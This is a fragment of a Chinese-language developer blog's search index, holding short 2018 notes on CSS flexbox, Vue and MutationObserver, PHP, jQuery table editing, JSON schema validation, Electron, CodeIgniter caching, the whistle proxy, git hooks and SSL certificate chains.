","date":"2018-10-25","objectID":"/blog/posts/flex-%E9%87%8D%E7%9B%B4%E7%BD%AE%E4%B8%AD-%E5%85%A7%E5%AE%B9%E5%A4%A7%E6%96%BC%E7%95%AB%E9%9D%A2%E4%B8%8A%E9%9D%A2%E8%A2%AB%E6%88%AA%E6%8E%89%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:1:0","tags":["flex","css"],"title":"flex 重直置中 內容大於畫面，上面被截掉解決方法","uri":"/blog/posts/flex-%E9%87%8D%E7%9B%B4%E7%BD%AE%E4%B8%AD-%E5%85%A7%E5%AE%B9%E5%A4%A7%E6%96%BC%E7%95%AB%E9%9D%A2%E4%B8%8A%E9%9D%A2%E8%A2%AB%E6%88%AA%E6%8E%89%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":["CSS"],"content":"子項目家margin:auto 很神奇的margin 可以直接用開發者工具去改CSS - flexbox 有點懶截圖 參考來源: html - Can’t scroll to top of flex item that is overflowing container - Stack Overflow ","date":"2018-10-25","objectID":"/blog/posts/flex-%E9%87%8D%E7%9B%B4%E7%BD%AE%E4%B8%AD-%E5%85%A7%E5%AE%B9%E5%A4%A7%E6%96%BC%E7%95%AB%E9%9D%A2%E4%B8%8A%E9%9D%A2%E8%A2%AB%E6%88%AA%E6%8E%89%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/:2:0","tags":["flex","css"],"title":"flex 重直置中 內容大於畫面，上面被截掉解決方法","uri":"/blog/posts/flex-%E9%87%8D%E7%9B%B4%E7%BD%AE%E4%B8%AD-%E5%85%A7%E5%AE%B9%E5%A4%A7%E6%96%BC%E7%95%AB%E9%9D%A2%E4%B8%8A%E9%9D%A2%E8%A2%AB%E6%88%AA%E6%8E%89%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95/"},{"categories":[["JavaScript"]],"content":"最近突然想起以前看到有一個加項目，卷軸超過其範圍會自動往下 印象中…是個DOM改變會自動偵測 所以我以為是listiner 但不是…. theomessin/vue-chat-scroll: Automatic scroll-to-bottom directive for vue. Vue 插件開發 - 聊天視窗滾動與自動加載，關於MutationObserver/Custom Directive « YJ Blog 簡單，使用就不說了 原理是用MutationObserver 但是不管DOM修改1000次，做rendering才會觸發 小玩官網範例vue-chat-scroll 可以看以下我小玩Promise 官網是for一次回圈非同步處理，所以才會觸發很多次MutationObserver \u003cbutton @click=\"pushMsg\"\u003eadd item\u003c/button\u003e \u003ch1\u003emessage\u003c/h1\u003e \u003cdiv class=\"messages\" v-chat-scroll=\"{always: false}\"\u003e \u003cdiv class=\"message\" v-for=\"n in messages\" :key=\"n\"\u003e{{ n }}\u003c/div\u003e \u003c/div\u003e ... pushMsg(){ // for (let i = 0 ; i \u003c 30 ; i++) // fetch('https://baconipsum.com/api/?type=meat-and-filler\u0026sentences=1\u0026start-with-lorem=1').then(function (response) { // return response.json() // }).then(data =\u003e this.messages.push(data[0])) var temp = [] for (let i = 0 ; i \u003c 30 ; i++) temp.push(fetch('https://baconipsum.com/api/?type=meat-and-filler\u0026sentences=1\u0026start-with-lorem=1').then(function (response) { return response.json() })) Promise.all(temp).then(data =\u003e data.forEach(e =\u003e this.messages.push(e))) // for (let i = 0 ; i \u003c 30 ; i++) // this.messages.push(\"data[0]\") } ","date":"2018-10-24","objectID":"/blog/posts/vue-chat-scroll%E5%92%8CMutationObserver%E5%B0%8F%E8%A8%98/:0:0","tags":["vue"],"title":"vue-chat-scroll和MutationObserver小記","uri":"/blog/posts/vue-chat-scroll%E5%92%8CMutationObserver%E5%B0%8F%E8%A8%98/"},{"categories":[["JavaScript"]],"content":"MutationObserver 簡單紀錄一下 MutationObserver 如上面所說不管DOM修改1000次，做rendering才會觸發 所以它也不算一個listener原因 除了範例對節點，它還可以對屬性、內容、子層html 詳細看文件MutationObserver - Web APIs | MDN 由於很少網站資訊介紹MutationObserver Mutation Observer API – JavaScript 标准参考教程（alpha） 這個網站算介紹滿清楚的 備份圖 var article = document.querySelector('article'); var options = { 'childList': true, 'attributes':true } ; observer.observe(article, options); 上面代码中，observe方法接受两个参数，第一个是所要观察的DOM元素是article，第二个是所要观察的变动类型（子节点变动和属性变动）。 观察器所能观察的 DOM 变动类型（即上面代码的options对象），有以下几种。 childList：子节点的变动（指新增，删除或者更改）。 attributes：属性的变动。 characterData：节点内容或节点文本的变动。 想要观察哪一种变动类型，就在option对象中指定它的值为true。需要注意的是，必须同时指定childList、attributes和characterData中的一种或多种，若未均指定将报错。 除了变动类型，options对象还可以设定以下属性： subtree：布尔值，表示是否将该观察器应用于该节点的所有后代节点。 attributeOldValue：布尔值，表示观察attributes变动时，是否需要记录变动前的属性值。 characterDataOldValue：布尔值，表示观察characterData变动时，是否需要记录变动前的值。 attributeFilter：数组，表示需要观察的特定属性（比如['class','src']）。 // 开始监听文档根节点（即\u003chtml\u003e标签）的变动 mutationObserver.observe(document.documentElement, { attributes: true, characterData: true, childList: true, subtree: true, attributeOldValue: true, characterDataOldValue: true }); 雖然除了聊天室感覺很需要這個功能 但還想不到什麼情境可以用到…. 要真的用其實直接用theomessin/vue-chat-scroll: Automatic scroll-to-bottom directive for vue. 就可以了XD ","date":"2018-10-24","objectID":"/blog/posts/vue-chat-scroll%E5%92%8CMutationObserver%E5%B0%8F%E8%A8%98/:1:0","tags":["vue"],"title":"vue-chat-scroll和MutationObserver小記","uri":"/blog/posts/vue-chat-scroll%E5%92%8CMutationObserver%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"今天發現PHP變數大小事情 還是小記，怕以後忘記 class, function 命名呼叫可以大小寫沒有分 變數,和class屬性命名大小寫有分 後來簡單測試一下，感覺PHP 變數跟函式可以撞名 變數分大小寫 函式不分大小寫 這樣就通了 還簡單做了小實驗 \u003c?php class a{ public $b = 'test'; function b(){ echo 'test2'; } } $a = new A; $a-\u003eB(); \u003c?php class a{ public $b = 'test'; function a(){ echo 'test2'; } } $a = new A; $a-\u003eA(); 跑出兩個test2test2 不小心測出意料結果，別緊張 這是因為建構式 PHP7.0開始會有提示 \u003cbr /\u003e \u003cb\u003eDeprecated\u003c/b\u003e: Methods with the same name as their class will not be constructors in a future version of PHP; a has a deprecated constructor in \u003cb\u003e[...][...]\u003c/b\u003e on line \u003cb\u003e4\u003c/b\u003e\u003cbr /\u003e PHP的細節觀念與撰寫習慣 – Bryce’S Note ","date":"2018-10-23","objectID":"/blog/posts/PHP%E8%AE%8A%E6%95%B8%E5%AE%A3%E5%91%8A%E5%A4%A7%E5%B0%8F%E5%AF%AB%E8%88%87vscode-PHP-intellisense-for-codeigniter/:0:0","tags":["vscode","php"],"title":"PHP變數宣告大小寫與vscode PHP intellisense for codeigniter","uri":"/blog/posts/PHP%E8%AE%8A%E6%95%B8%E5%AE%A3%E5%91%8A%E5%A4%A7%E5%B0%8F%E5%AF%AB%E8%88%87vscode-PHP-intellisense-for-codeigniter/"},{"categories":["PHP"],"content":"vscode PHP intellisense for codeigniter PHP intellisense for codeigniter - Visual Studio Marketplace 安裝這個可以方便在vscode寫CI 不過…由於我公司開發規範第一個檔名都要大寫… 所以呼叫mod那邊好像怪怪的 但方便PHP intellisense都是好套件XD 但注意需要放置system 由於我們公司專案沒有在底層放system 所以需要自己copy一份system到目錄 或去vscode設定那邊調整位置 ","date":"2018-10-23","objectID":"/blog/posts/PHP%E8%AE%8A%E6%95%B8%E5%AE%A3%E5%91%8A%E5%A4%A7%E5%B0%8F%E5%AF%AB%E8%88%87vscode-PHP-intellisense-for-codeigniter/:1:0","tags":["vscode","php"],"title":"PHP變數宣告大小寫與vscode PHP intellisense for codeigniter","uri":"/blog/posts/PHP%E8%AE%8A%E6%95%B8%E5%AE%A3%E5%91%8A%E5%A4%A7%E5%B0%8F%E5%AF%AB%E8%88%87vscode-PHP-intellisense-for-codeigniter/"},{"categories":["網頁"],"content":"最近看到一種很神奇的寫法 在這邊簡單記錄一下 \u003ctable\u003e \u003ctr\u003e \u003cth\u003e\u003c/th\u003e \u003cth\u003eAA\u003c/th\u003e \u003cth\u003eBB\u003c/th\u003e \u003cth\u003eCC\u003c/th\u003e \u003cth\u003eDD\u003c/th\u003e \u003cth\u003eEE\u003c/th\u003e \u003c/tr\u003e \u003ctr\u003e \u003cth\u003e項目1\u003cth\u003e \u003ctd class=\"AA\"\u003eAA\u003c/td\u003e \u003ctd class=\"BB\"\u003eBB\u003c/td\u003e \u003ctd class=\"CC\"\u003eCC\u003c/td\u003e \u003ctd class=\"DD\"\u003eDD\u003c/td\u003e \u003ctd class=\"EE\"\u003eEE\u003c/td\u003e \u003c/tr\u003e \u003ctr\u003e \u003cth\u003e項目2\u003cth\u003e \u003ctd class=\"AA\"\u003eAA\u003c/td\u003e \u003ctd class=\"BB\"\u003eBB\u003c/td\u003e \u003ctd class=\"CC\"\u003eCC\u003c/td\u003e \u003ctd class=\"DD\"\u003eDD\u003c/td\u003e \u003ctd class=\"EE\"\u003eEE\u003c/td\u003e \u003c/tr\u003e \u003ctr\u003e \u003cth\u003e項目2\u003cth\u003e \u003ctd class=\"AA\"\u003eAA\u003c/td\u003e \u003ctd class=\"BB\"\u003eBB\u003c/td\u003e \u003ctd class=\"CC\"\u003eCC\u003c/td\u003e \u003ctd class=\"DD\"\u003eDD\u003c/td\u003e \u003ctd class=\"EE\"\u003eEE\u003c/td\u003e \u003c/tr\u003e \u003c/table\u003e $('table td').click(function(){ if(!$(this).is('.input')){ $(this).addClass('input').html('\u003cinput type=\"text\" value=\"'+ $(this).text() +'\" /\u003e').find('input').focus().blur(function(){ var id = $(this).parent().siblings(\"th:eq(0)\").text(); var thisclass = $(this).parent().attr(\"class\"); var thisvalue=$(this).val(); $.ajax({ type: 'POST', url: 'update', data: \"id=\"+id+\"\u0026thisclass=\"+thisclass+\"\u0026thisvalue=\"+thisvalue, }); $(this).parent().removeClass('input').html($(this).val() || 0); }); } }).hover(function(){ $(this).addClass('hover'); },function(){ $(this).removeClass('hover'); }); 看到這個寫法，覺得他還缺少了存檔驗證 所以修改程式碼 $('table td').click(function(){ var source_text = $(this).text(); if(!$(this).is('.input')){ $(this).addClass('input').html('\u003cinput type=\"text\" value=\"'+ $(this).text() +'\" /\u003e').find('input').focus().blur(function(){ if (source_text == $(this).val()){ $(this).parent().removeClass('input').html($(this).val() || 0); } }).change(function(){ if (source_text == $(this).val()) return false; var id = $(this).parent().siblings(\"th:eq(0)\").text(); var thisclass = $(this).parent().attr(\"class\"); var thisvalue=$(this).val(); $.ajax({ type: 'POST', url: 'update.php', data: \"thisid=\"+thisid+\"\u0026thisclass=\"+thisclass+\"\u0026thisvalue=\"+thisvalue, success:()=\u003e{ $(this).parent().removeClass('input').html($(this).val() || 0); }, error:()=\u003e{ alert('更新失敗'); $(this).parent().removeClass('input').html(source_text || 0); } }); }); } }).hover(function(){ $(this).addClass('hover'); },function(){ $(this).removeClass('hover'); }); PHP部份就不寫了，其實可以不要用class來當改db名字 不然還要多處理class 後面加的不份 用class還需PHP後端還需要split空白過濾之後的東西 PHP回傳錯誤，這樣能讓ajax進入error function PHP: http_response_code - Manual ","date":"2018-10-20","objectID":"/blog/posts/%E5%AF%A6%E7%94%A8%E5%BF%AB%E9%80%9F%E6%94%B9table%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95/:0:0","tags":["html","js"],"title":"實用快速改table資料方法","uri":"/blog/posts/%E5%AF%A6%E7%94%A8%E5%BF%AB%E9%80%9F%E6%94%B9table%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"最近收到一份JSON格式資料 要實作一個API程式 在沒有任何文件囧境 看完好幾千行JSON 後來用Firefox下比對JSON長度 但測試實候發現有些 integer 型態我傳成 string 我發現單純用Firefox肉眼看不行 在想有什麼實用工具可以驗證 ","date":"2018-10-20","objectID":"/blog/posts/%E9%A9%97%E8%AD%89%E5%BF%AB%E9%80%9F%E6%AA%A2%E6%9F%A5JSON%E6%96%B9%E6%B3%95/:0:0","tags":["json"],"title":"驗證快速檢查JSON方法","uri":"/blog/posts/%E9%A9%97%E8%AD%89%E5%BF%AB%E9%80%9F%E6%AA%A2%E6%9F%A5JSON%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"檢查JSON type ","date":"2018-10-20","objectID":"/blog/posts/%E9%A9%97%E8%AD%89%E5%BF%AB%E9%80%9F%E6%AA%A2%E6%9F%A5JSON%E6%96%B9%E6%B3%95/:1:0","tags":["json"],"title":"驗證快速檢查JSON方法","uri":"/blog/posts/%E9%A9%97%E8%AD%89%E5%BF%AB%E9%80%9F%E6%AA%A2%E6%9F%A5JSON%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"Paste JSON as Code -vscode套件 Paste JSON as Code - Visual Studio Marketplace Paste JSON as Code 可以產生JSON Schema 還可以產生測試程式 有測試nodejs，還是無法知道哪裡有問題 aa = require('./json_check'); aa.testToJson(`{ \"test\": \"test\" }`); 他還能產生JSON schema 可以把JSON Schema貼到這個上面 下面會回傳錯誤訊息 JSON Schema Validator - Newtonsoft ","date":"2018-10-20","objectID":"/blog/posts/%E9%A9%97%E8%AD%89%E5%BF%AB%E9%80%9F%E6%AA%A2%E6%9F%A5JSON%E6%96%B9%E6%B3%95/:1:1","tags":["json"],"title":"驗證快速檢查JSON方法","uri":"/blog/posts/%E9%A9%97%E8%AD%89%E5%BF%AB%E9%80%9F%E6%AA%A2%E6%9F%A5JSON%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"線上驗證工具 JSON Schema Validator - vscode套件本機好像失效，評價3顆星…. Json Schema with VS Code – Omkar’s Tech Blog 範例 GitHub - omkarmore83/json-schema-vscode-example: Examples for Json Schema with Visual Studio code ","date":"2018-10-20","objectID":"/blog/posts/%E9%A9%97%E8%AD%89%E5%BF%AB%E9%80%9F%E6%AA%A2%E6%9F%A5JSON%E6%96%B9%E6%B3%95/:1:2","tags":["json"],"title":"驗證快速檢查JSON方法","uri":"/blog/posts/%E9%A9%97%E8%AD%89%E5%BF%AB%E9%80%9F%E6%AA%A2%E6%9F%A5JSON%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"內建VSCODE就有檢查工具 內建就有的功能，但必須設定schema JSON editing in Visual Studio Code 這邊可以選擇工作區域 { \"json.schemas\": [ { \"fileMatch\": [ \".myconfig\" ], \"schema\": { \"$schema\": \"http://json-schema.org/draft-04/schema#\", \"properties\": { \"$schema\": { \"type\": \"string\" } }, \"patternProperties\": { \"Questions_(EN|DE)$\": { \"$ref\" : \"#/definitions/questions-schema\" } }, \"additionalProperties\": false, \"definitions\": { \"questions-schema\": { \"type\":\"array\", \"items\": { \"$ref\" : \"#/definitions/question-schema\" } }, \"question-schema\": { \"properties\": { \"question\" : { \"type\": \"string\" }, \"option_1\": { \"$ref\": \"#/definitions/option-schema\" }, \"option_2\": { \"$ref\": \"#/definitions/option-schema\" }, \"option_3\": { \"$ref\": \"#/definitions/option-schema\" }, \"option_4\": { \"$ref\": \"#/definitions/option-schema\" }, \"correct_option\": { \"type\": \"integer\", \"minimum\": 1, \"maximum\": 4 }, \"moreInfo\": { \"type\": \"string\" }, \"level\": { \"type\": \"integer\", \"minimum\": 1, \"maximum\": 10, \"description\": \"Level inditates the deficulty of the question. Valid values between 1 and 10\" }, \"category\": { \"$ref\": \"#/definitions/category-schema\" }, \"multimedia\": { \"type\": \"array\", \"items\": { \"$ref\": \"#/definitions/multimedia-item-schema\" } } }, \"required\":[ \"question\", \"option_1\", \"option_2\", \"option_3\", \"option_4\", \"correct_option\" ], \"additionalProperties\": false, \"defaultSnippets\": [ { \"label\" : \"New Question\", \"description\": \"Creates a New Question template\", \"body\": { \"question\": \"$1\", \"option_1\": \"$2\", \"option_2\": \"$3\", \"option_3\": \"$4\", \"option_4\": \"$5\", \"correct_option\": \"^$6\" } } ] }, \"category-schema\": { \"enum\": [ \"GEOGRAPHY\", \"HISTORY\", \"MATH\", \"CURRENT_AFFAIRS\" ] }, \"multimedia-item-schema\": { \"type\": \"object\", \"properties\": { \"id\" : { \"type\": \"string\" }, \"type\": { \"type\": \"string\" }, \"path\": { \"type\": \"string\" } }, \"required\": [ \"id\", \"type\", \"path\" ], \"additionalProperties\": false }, \"option-schema\": { \"oneOf\": [ { \"type\": \"string\" }, { \"type\": \"object\", \"properties\": { \"image\": { \"type\" : \"string\" } } } ] } } } }, ] } 當然全部都塞到這邊很難管理 { \"json.schemas\": [ { \"fileMatch\": [ \"/lyric.api.json\" ], \"url\": \"./lyric.schema.json\" } ] } 比較注意的地方fileMatch不需要加. 加.反而找不到位置 可搭配*用在fileMatch ","date":"2018-10-20","objectID":"/blog/posts/%E9%A9%97%E8%AD%89%E5%BF%AB%E9%80%9F%E6%AA%A2%E6%9F%A5JSON%E6%96%B9%E6%B3%95/:2:0","tags":["json"],"title":"驗證快速檢查JSON方法","uri":"/blog/posts/%E9%A9%97%E8%AD%89%E5%BF%AB%E9%80%9F%E6%AA%A2%E6%9F%A5JSON%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"其他工具 GitHub - java-json-tools/json-schema-validator: A JSON Schema validation implementation in pure Java, which aims for correctness and performance, in that order 一些JSON SCHEMA範例 JSON Schema Store 做完這個，我發現XML要怎麼快速檢單驗證呢 但發現XML有一個叫XSD 一些工具如下，參考來源:XML Schema(XSD)验证工具？ - 码客 Xerces xmlstarlet XML validator and editor for Windows Download XML Notepad 2007 from Official Microsoft Download Center 筆記：Java IDE 從 XSD 轉出 XML – Aya Wong – Medium W3C XML Schema (XSD) Validation online Jax 的工作紀錄: [PHP][Java][C#] 用 XSD 驗證 XML 最後找了範例用在W3C XML Schema (XSD) Validation online 可以驗證成功 \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE note SYSTEM \"http://www.w3school.com.cn/dtd/note.dtd\"\u003e \u003cnote\u003e \u003cto\u003eGeorge\u003c/to\u003e \u003cfrom\u003eJohn\u003c/from\u003e \u003cheading\u003eReminder\u003c/heading\u003e \u003cbody\u003eDon't forget the meeting!\u003c/body\u003e \u003c/note\u003e \u003c?xml version=\"1.0\"?\u003e \u003cxs:schema xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" targetNamespace=\"http://www.w3school.com.cn\" xmlns=\"http://www.w3school.com.cn\" elementFormDefault=\"qualified\"\u003e \u003cxs:element name=\"note\"\u003e \u003cxs:complexType\u003e \u003cxs:sequence\u003e \u003cxs:element name=\"to\" type=\"xs:string\"/\u003e \u003cxs:element name=\"from\" type=\"xs:string\"/\u003e \u003cxs:element name=\"heading\" type=\"xs:string\"/\u003e \u003cxs:element name=\"body\" type=\"xs:string\"/\u003e \u003c/xs:sequence\u003e \u003c/xs:complexType\u003e \u003c/xs:element\u003e \u003c/xs:schema\u003e 之後有用到，再寫一篇記錄出來 ","date":"2018-10-20","objectID":"/blog/posts/%E9%A9%97%E8%AD%89%E5%BF%AB%E9%80%9F%E6%AA%A2%E6%9F%A5JSON%E6%96%B9%E6%B3%95/:3:0","tags":["json"],"title":"驗證快速檢查JSON方法","uri":"/blog/posts/%E9%A9%97%E8%AD%89%E5%BF%AB%E9%80%9F%E6%AA%A2%E6%9F%A5JSON%E6%96%B9%E6%B3%95/"},{"categories":["JavaScript"],"content":"最近爬到能electron不會重新開啟程式方法 筆記筆記 // 點擊圖標(桌面快捷方式)檢查當前活動實例的個數 const isSecondInstance = app.makeSingleInstance(() =\u003e { if (mainWindow) { if (mainWindow.isMinimized()) { mainWindow.restore(); // 窗口從最小化恢復時觸發 } mainWindow.show(); // mainWindow.maximize(); mainWindow.focus(); } }); if (isSecondInstance) { app.quit(); } 參考使用 electron-vue 搭建桌面應用開發模板 - 神馬文庫 備份圖 ","date":"2018-10-20","objectID":"/blog/posts/electron%E4%B8%8D%E6%9C%83%E9%87%8D%E8%A6%86%E9%96%8B%E5%95%9F%E7%A8%8B%E5%BC%8F/:0:0","tags":["electron"],"title":"electron不會重覆開啟程式","uri":"/blog/posts/electron%E4%B8%8D%E6%9C%83%E9%87%8D%E8%A6%86%E9%96%8B%E5%95%9F%E7%A8%8B%E5%BC%8F/"},{"categories":["electron"],"content":"最近做一個蕃茄鐘，但是常常忘記點開始時間導致甚麼沒有用到 爬文有查到winapi可以抓到閒置時間 於是看electron是否能串接winapi資訊 就踩到很多個雷 首先，winapi - npm require('winapi').GetLastInputInfo這個可以爬到我們要的功能 以為會非常簡單，但是安裝卻不順利 之前有爬到網頁講解node-gyp跟gyp介紹，但現在找不到 但有找到有簡單介紹 node-gyp 这货是 Node.js 中编译原生模块用的。自从 Node.js v0.8 之后，它就跟 Node.js 黏上了，在此之前它的默认编译帮助包是 node-waf[^3]，对于老 Noder 来说应该不会陌生的。 GYP node-gyp 是基于 GYP[^4] 的。它会识别包或者项目中的 binding.gyp[^5] 文件，然后根据该配置文件生成各系统下能进行编译的项目，如 Windows 下生成 Visual Studio 项目文件（*.sln 等），Unix 下生成 Makefile。在生成这些项目文件之后，node-gyp 还能调用各系统的编译工具（如 GCC）来将项目进行编译，得到最后的动态链接库 *.node 文件。 參考網址:从暴力到 NAN 再到 NAPI——Node.js 原生模块开发方式变迁 · 一个伪宅级别的码畜。 以為簡單安裝node-gyp就能搞定…，但其實要安裝VSSTUDIO C++跟 python2 注意電腦有裝3的要讓預設變成2 安裝環境建議到VM玩 不然電腦會裝有的沒的東西 我就選擇在VM Win7環境做編譯 簡單記錄安裝node-gyp兩個方法 npm install --global --production windows-build-tools 我發現新版版本自帶安裝選項，不過會裝更多有的沒的東西orz ![serve:electron\"](./1.png “npm run) 當我以為要成功的時候，但竟然跑出這個東西 ![serve:electron”](./3.png “npm run) 找到解決方法 以下兩個步驟 npm run build:electron會產生 winapi_win32_64_electron.node 修改node_module底下winapi的index.js程式 這個是我依照錯誤去找的 沒想到改成electron就能跑XD ![serve:electron”](./4.png “npm run) ![serve:electron”](./2.png “npm run) 最後，就能順利使用require('winapi').GetLastInputInfo函式 他會得到很多秒數 另外 有爬到另一個別人寫好整合 他也包含MAC,Linux,Window 簡稱idle time(不知道是不是閒置時間意思??) desktop-idle - npm 安裝下去使用不需設定index.js 而且他的秒數比較直覺 後來就用這個函式庫 其他資訊: [從libuv/v8到nodejs 系列] ：Libuv - 環境建置與說明 « YJ Blog Electron通过ffi调用DLL - 陈海峰的博客 - CSDN博客 [Electron] 如何使用 Node.js 原生模組 nodejs/node-gyp: Node.js native addon build tool ","date":"2018-10-19","objectID":"/blog/posts/electron%E4%BD%BF%E7%94%A8winapi%E7%AD%86%E8%A8%98/:0:0","tags":["electron"],"title":"electron使用winapi筆記","uri":"/blog/posts/electron%E4%BD%BF%E7%94%A8winapi%E7%AD%86%E8%A8%98/"},{"categories":[["Codeigiter"]],"content":"最近做一個排行榜API 但回傳時間真的太久了 於是做一個緩存 突然想到Codeigiter內建有網頁緩存裝置 竟然內建有這個功能 那還要自己手刻嗎XD PHP if(! isset($_SERVER['HTTP_X_KEY']) || $_SERVER['HTTP_X_KEY'] != \"xxxxxxx\") { http_response_code( 500 ); die( 'NO ENTER' ); } header(\"x-api-key: xxxxxxx\"); $this-\u003eoutput-\u003ecache(1); echo \"hello world2\"; 就這麼簡單!!! 原本怕這邊簡單測試假如失敗的時候，會不會直接緩存 會影響OK的， 測試結果是不會的 cache(分鐘) 最後小記 因為PHP Codeigiter是吃a權限(不是apache) 但是cache是資料夾是設定755 原本想先對cache做777 其實我還不知道資料夾權限是吃什麼 最後可以跑cache 所以最後看到cache檔案室吃apache 其實把那個資料夾改成apache權限就能用了 也沒必要設定777 假如真的覺得他的cache檔案設定不太好 可以從設定檔設定放置路徑 $config['cache_path'] = \"\"。如果您不想使用默認的緩存目錄（system/cache/）來存儲緩存，可以設置完整的服務器目錄 【ci框架】config.php配置文檔解讀 - 掃文資訊 有空來做php 讀取封包header筆記 PHP 讀取客製化傳送進來的 HTTP Header | Tsung’s Blog PHP無法在$_SERVER內取得自訂header apache_request_headers()好像要裝apache套件才能用的樣子 PHP: getallheaders - Manual 所以最後只能用原生PHP抓header方法 參照PHP無法在$_SERVER內取得自訂header 順利解決 ","date":"2018-10-13","objectID":"/blog/posts/CI3-%E7%B6%B2%E9%A0%81%E7%B7%A9%E5%AD%98-web-cache-%E5%B0%8F%E8%A8%98/:0:0","tags":["CI"],"title":"CI3 網頁緩存(web cache)小記","uri":"/blog/posts/CI3-%E7%B6%B2%E9%A0%81%E7%B7%A9%E5%AD%98-web-cache-%E5%B0%8F%E8%A8%98/"},{"categories":["實用工具"],"content":"最近工司需要測試APP API 明天要帶我的Linux筆電到公司 沒有類似Fiddler工具 今天爬到一個好用的工具 簡單筆記一下 首先有找到在Linux 下開啟Linux(Ubuntu)环境下使用Fiddler - 海鸟 - 博客园 但是我不通時裝其他的東西 httproxy - Fiddler 在 linux/OSx 下的替代品? - SegmentFault 思否 裡面提到這些 Linux(Ubuntu)环境下使用Fiddler - 海鸟 - 博客园 httproxy - Fiddler 在 linux/OSx 下的替代品? - SegmentFault 思否 deemstone/Dproxy: Web调试代理,类似Fiddler的工具. 完全Nodejs编写,跨平台. A smarty proxy tool for web debugging, it’s works like Fiddler. Charles Web Debugging Proxy • HTTP Monitor / HTTP Proxy / HTTPS \u0026 SSL Proxy / Reverse Proxy Wireshark · Download Fiddler Alternatives for Linux - AlternativeTo.net goddyZhao/nproxy: A cli proxy tool specialized in file replacing avwo/whistle: HTTP, HTTPS, WebSocket debugging proxy AlloyTeam/Rythem: a fiddler-like project using Qt 【AlloyTeam Web前端工具系列2】开源跨平台的Web抓包分析工具 Rythem (2012-09-19更新) | AlloyTeam 最後我選擇，avwo/whistle: HTTP, HTTPS, WebSocket debugging proxy 我Linux有裝nodejs，所以安裝設定有中文文件关于whistle · GitBook 安裝方法 npm install -g whistle 啟動 w2 start 結束 w2 stop 就這麼簡單!!!! 在接下來設定Android Wifi Proxy就完成了 查看封包也是看Web介面xxx.xxx.xxx.xxx:8899 但是設定proxy也是同一個port 這是什麼巫術XDD 2021-05-02 GitHub - youzan/zan-proxy: An extensible proxy for PC/Mobile/APP developer GitHub - alibaba/anyproxy: A fully configurable http/https proxy in NodeJS ","date":"2018-10-13","objectID":"/blog/posts/whistle-%E5%9C%A8Linux%E4%B8%8B%E9%A1%9E%E4%BC%BCFiddler%E6%8A%93%E5%B0%81%E5%8C%85%E5%B7%A5%E5%85%B7/:0:0","tags":["whistle"],"title":"whistle - 在Linux下類似Fiddler抓封包工具","uri":"/blog/posts/whistle-%E5%9C%A8Linux%E4%B8%8B%E9%A1%9E%E4%BC%BCFiddler%E6%8A%93%E5%B0%81%E5%8C%85%E5%B7%A5%E5%85%B7/"},{"categories":["Git"],"content":"最近在pull master實候 竟然發現merge…. 雖然不知道發生了什麼事情 但不應該這樣 後來找到是我在master commit!!!!! 立馬不說，先壓縮一個檔案起來(裡面有程式還沒commit 怕怕) 先用git reset xxxx^ --hard 順利還原!!! 未了怕悲劇發生，於是我開始找如何防止master commit 後來找到Git Branch Warnings - Visual Studio Marketplace 不過下載數不高，所以沒有使用 最後找到git hooks - prevent commit to local master branch and prevent push to remote master branch #!/bin/sh # prevent commit to local master branch branch=`git symbolic-ref HEAD` if [ \"$branch\" = \"refs/heads/master\" ]; then echo \"pre-commit hook: Can not commit to the local master branch.\" exit 1 fi exit 0 最後修改 #!/bin/sh # prevent commit to local master branch branch=`git symbolic-ref HEAD` if [ \"$branch\" = \"refs/heads/master\" ] || [ \"$branch\" = \"refs/heads/mixed\" ]; then echo \"pre-commit hook: Can not commit to the local master/mixed branch.\" exit 1 fi exit 0 放在.git/hook/pre-commit就完成 ","date":"2018-10-11","objectID":"/blog/posts/git%E4%BF%9D%E8%AD%B7%E5%88%86%E6%94%AF%E4%B8%8D%E6%9C%83%E8%A2%ABcommit/:0:0","tags":["git","git hook"],"title":"git保護分支不會被commit","uri":"/blog/posts/git%E4%BF%9D%E8%AD%B7%E5%88%86%E6%94%AF%E4%B8%8D%E6%9C%83%E8%A2%ABcommit/"},{"categories":["程式心法"],"content":"最近公司https網站很奇怪，桌面版的Chrome,Firefox顯示正常(安全) 但是手機版的Chrome正常，Firefox不正常(非安全) 倒置Line App內崁網頁不正常(連結https那台主機沒有正常跳頁) 之前在保哥粉絲團看過申請 Let’s Encrypt 免費 SSL 憑證一次就上手 所以對憑證有基本的了解 但沒深入了解 目前有些網站憑證，手機版(Android)Webview會有問題。IOS皆正常 但點入登入(網域)LINE會空白頁\u0026Android Firefox會顯是為安全憑證 正常桌面瀏覽器 發現公司不同子網域是用萬用憑證 簡單來說就是*.xxxx.com.tw 但問題來了…，為什麼a網段根b網段(都是*.xxxx.com.tw) 為什麼a正常、b不正常 最後爬到這個，DigiCert 的证书，在浏览器（firefox，chrome）上都绿了应该没问题，但是 wget 总是出错 - V2EX intermediate certifcate(中間憑證)有問題… 瀏覽器會智能判斷，所以不會跳出錯誤 經過實驗postman也不會出錯….(可能他是Chrome吧XD) 感覺哪裡怪怪的 後來發現SSL Certificate Checker - Diagnostic Tool | DigiCert.com可以測試憑證 你可能不知道的憑證大小事 - 吾輩乃程序猿 [筆記] SSL 憑證購買記 - Yu-Cheng Chuang’s Blog 裡面有介紹中繼憑證可能會影像憑證安全性 跟MIS說是憑證問題，可能要查看看 不過MIS說是廠商給他的，所以可能他要問廠商才清楚 目前查到這樣了 其他相關筆記 [Web] 注意 Wildcard 憑證的適用保護範圍 | EPH 的程式日記 如果您的用戶在Chrome與其他瀏覽器中看到警告資訊，那麼您需要做什麼 | DigiCert \u0026 Symantec 